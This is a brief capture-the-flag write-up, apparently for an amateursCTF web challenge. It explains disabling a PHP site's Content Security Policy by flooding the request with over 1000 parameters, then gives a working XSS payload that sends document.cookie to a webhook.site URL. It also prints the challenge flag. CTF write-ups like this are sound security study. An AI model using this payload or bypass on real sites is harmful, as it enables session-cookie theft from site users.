solver: lilsadfoqs - will have full explaination real quick later :Đ

credit: https://blog.arkark.dev/2025/09/08/asisctf-quals#step-1-forcing-quirks-mode-with-php-warnings

and: https://x.com/pilvar222/status/1784619224670797947/photo/1

amateursCTF{P3r_4sp3r4_4d_4str4_111}

<img width="1543" height="496" alt="image" src="https://github.com/user-attachments/assets/16722070-a509-466f-b9dc-1dba33091210" />

# Quick explain

web/index.php/username=pwn3dBYf0q5&a&a&a (1000 times &a) will cause the php.ini max_input_vars error

<img width="1405" height="244" alt="image" src="https://github.com/user-attachments/assets/156209d3-ee65-4550-8eb7-dab0e81bbc7e" />

which also causes "Warning: Cannot modify header information - headers already sent in /app/index.php on line 3", so no more CSP to deal with:

<img width="306" height="184" alt="image" src="https://github.com/user-attachments/assets/0ea0e88b-0827-48c3-a9b5-56c0f0f9ad41" />

## Winning payload: 
`{"username":"<script>fetch('https://webhook.site/67512745-dd99-43df-9630-5c1b131f8d90?c='%2BencodeURIComponent(document.cookie));</script>&a&a&a.....&a&a&a&a&a&a"}` 

POST request with Header: Content-Type: application/json

> remember to url encode the char `+` at `...?c'+enc...` -> `%2B`

